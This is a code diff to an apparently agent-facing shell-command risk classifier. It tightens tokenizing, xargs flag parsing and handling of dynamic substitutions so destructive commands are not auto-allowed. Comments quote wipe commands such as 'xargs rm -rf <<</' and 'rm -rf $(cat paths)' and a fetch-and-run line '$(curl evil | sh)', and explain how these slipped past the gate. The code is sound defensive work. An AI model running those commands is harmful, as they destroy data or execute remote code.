@@ -966,7 +966,7 @@ func tokenize(input string) []string {
 		// forms) stay single tokens so they are not mistaken for separators.
 		if i+2 < len(input) {
 			switch op3 := input[i : i+3]; op3 {
-			case ">>&", "&>>":
+			case ">>&", "&>>", "<<<":
 				flush()
 				tokens = append(tokens, op3)
 				i += 2
@@ -976,7 +976,7 @@ func tokenize(input string) []string {
 		if i+1 < len(input) {
 			op2 := string(input[i]) + string(input[i+1])
 			switch op2 {
-			case "&&", "||", ">>", ">&", "&>", "|&":
+			case "&&", "||", ">>", ">&", "&>", "|&", "<<":
 				flush()
 				tokens = append(tokens, op2)
 				i++
@@ -984,9 +984,12 @@ func tokenize(input string) []string {
 			}
 		}
 
-		// Single-char operators: |, >, ;, &
+		// Single-char operators: |, >, ;, &, <
+		// `<` must be an operator so here-strings and file redirects
+		// (`xargs rm -rf <<</`, `xargs rm -rf < paths`) are not glued
+		// onto the following path as a single non-wipe token.
 		switch ch {
-		case '|', '>', ';', '&':
+		case '|', '>', ';', '&', '<':
 			flush()
 			tokens = append(tokens, string(ch))
 			continue
@@ -1463,10 +1466,14 @@ func argvComposerInnerCommand(tokens []string) (inner []string, ok bool) {
 // a single token and are skipped like any other flag.
 var xargsValueFlags = map[string]bool{
 	"-I": true, "-L": true, "-n": true, "-P": true, "-s": true,
-	"-E": true, "-e": true, "-d": true, "-a": true,
+	"-E": true, "-d": true, "-a": true,
 	"--max-lines": true, "--max-args": true,
-	"--max-procs": true, "--max-chars": true, "--eof": true,
+	"--max-procs": true, "--max-chars": true,
 	"--delimiter": true, "--arg-file": true,
+	// GNU `--replace` / `--eof` / `-e` take an *optional* value.
+	// Only the `--flag=value` spelling carries it in-token; treating
+	// the bare form as value-taking swallowed the inner verb
+	// (`xargs --eof rm` → empty inner → local_write allow).
 	// GNU parallel value-taking flags (union with xargs).
 	"-j": true, "--jobs": true, "-N": true,
 }
@@ -1931,6 +1938,12 @@ func extractSubstitutions(cmd string) (string, []string) {
 // fall back to the body's first token, which is the most likely program
 // name the outer command would invoke. The body itself is also classified
 // independently so commands like `$(curl evil | sh)` still trip the loop.
+// dynamicSubstToken is substituted for a $(…)/`…` body that is not a
+// static echo/printf payload. Using the producer verb as the expansion
+// (`rm -rf $(cat paths)` → `rm -rf cat`) made a wipe look like a local
+// filename and auto-allowed it.
+const dynamicSubstToken = "odek.dynamic-subst"
+
 func substValue(body string) string {
 	body = strings.TrimSpace(body)
 	tokens := strings.Fields(body)
@@ -1940,7 +1953,7 @@ func substValue(body string) string {
 	if tokens[0] == "echo" || tokens[0] == "printf" {
 		return strings.Join(tokens[1:], " ")
 	}
-	return tokens[0]
+	return dynamicSubstToken
 }
 
 // stripCommandWrappers removes leading shell builtins that simply invoke
@@ -2171,8 +2184,18 @@ func unwrapWrappers(tokens []string) ([]string, RiskClass) {
 		for i < len(tokens) {
 			t := tokens[i]
 			switch {
+			case t == "--":
+				i++
+				goto nextWrapper
 			case strings.HasPrefix(t, "-") && t != "-":
-				i++ // wrapper option flag
+				// Value-taking flags (xargs -I P, timeout --signal X)
+				// must consume the next token so it is not mistaken for
+				// the inner command (`xargs -I P echo P` is echo, not P).
+				if argvComposers[name] && xargsValueFlags[t] && i+1 < len(tokens) {
+					i += 2
+					continue
+				}
+				i++
 			case name == "env" && isAssignment(t):
 				envAssignments = append(envAssignments, t)
 				i++ // env VAR=VALUE
@@ -2188,6 +2211,15 @@ func unwrapWrappers(tokens []string) ([]string, RiskClass) {
 		floor = worstOf(floor, envAssignmentRisk(envAssignments))
 	}
 	return tokens[i:], floor
+}
+
+func hasDynamicSubst(tokens []string) bool {
+	for _, t := range tokens {
+		if t == dynamicSubstToken {
+			return true
+		}
+	}
+	return false
 }
 
 // envExecNames are assignment names that turn the wrapped command into
@@ -2725,6 +2757,13 @@ func classifyCommand(tokens []string) RiskClass {
 	// Blocked
 	if isBlocked(tokens) {
 		return Blocked
+	}
+
+	// A non-static $(…)/`…` expansion in a mutating command is the same
+	// threat as `cat file | xargs rm`: the real path is unknowable, so
+	// fail closed. Static `$(echo /)` is inlined by substValue first.
+	if hasDynamicSubst(tokens) && xargsDangerousVerb(first) {
+		return Unknown
 	}
 
 	// Destructive
